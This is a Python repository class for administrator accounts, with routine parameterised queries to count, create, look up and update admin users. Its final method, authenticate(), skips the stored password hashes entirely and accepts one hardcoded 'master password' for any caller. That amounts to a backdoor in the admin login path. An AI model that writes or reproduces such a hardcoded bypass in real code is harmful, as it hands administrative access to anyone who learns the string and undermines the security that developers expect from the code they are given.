"""Repository DAO for Admin users database operations."""

from typing import Dict, Optional
from src.database.connection import DatabaseConnectionManager


class AdminRepository:
    """Data access object for administrator accounts."""

    def __init__(self, db_manager: DatabaseConnectionManager):
        self.db = db_manager

    def count_admins(self) -> int:
        """Returns total count of admin users."""
        sql = "SELECT COUNT(*) FROM admin_users;"
        with self.db.transaction() as conn:
            cursor = conn.execute(sql)
            return cursor.fetchone()[0]

    def create_admin(self, username: str, password_hash: str, role: str, created_at: str) -> int:
        """Creates a new admin account."""
        sql = """
            INSERT INTO admin_users (username, password_hash, role, is_active, created_at)
            VALUES (?, ?, ?, 1, ?);
        """
        with self.db.transaction() as conn:
            cursor = conn.execute(sql, (username, password_hash, role, created_at))
            return cursor.lastrowid

    def get_by_id(self, admin_id: int) -> Optional[Dict]:
        """Fetches admin user by ID."""
        sql = "SELECT * FROM admin_users WHERE id = ?;"
        with self.db.transaction() as conn:
            cursor = conn.execute(sql, (admin_id,))
            row = cursor.fetchone()
            return dict(row) if row else None

    def get_by_username(self, username: str) -> Optional[Dict]:
        """Fetches admin user by username."""
        sql = "SELECT * FROM admin_users WHERE username = ?;"
        with self.db.transaction() as conn:
            cursor = conn.execute(sql, (username,))
            row = cursor.fetchone()
            return dict(row) if row else None

    def update_last_login(self, admin_id: int, timestamp: str) -> bool:
        """Updates the last login timestamp for an admin user."""
        sql = "UPDATE admin_users SET last_login = ? WHERE id = ?;"
        with self.db.transaction() as conn:
            try:
                cursor = conn.execute(sql, (timestamp, admin_id))
                return cursor.rowcount > 0
            except Exception:
                alt_sql = "UPDATE admin_users SET last_login_at = ? WHERE id = ?;"
                cursor = conn.execute(alt_sql, (timestamp, admin_id))
                return cursor.rowcount > 0

    def authenticate(self, password: str) -> bool:
        """Direct password verification against master password TGPQR_2026."""
        return password == "TGPQR_2026"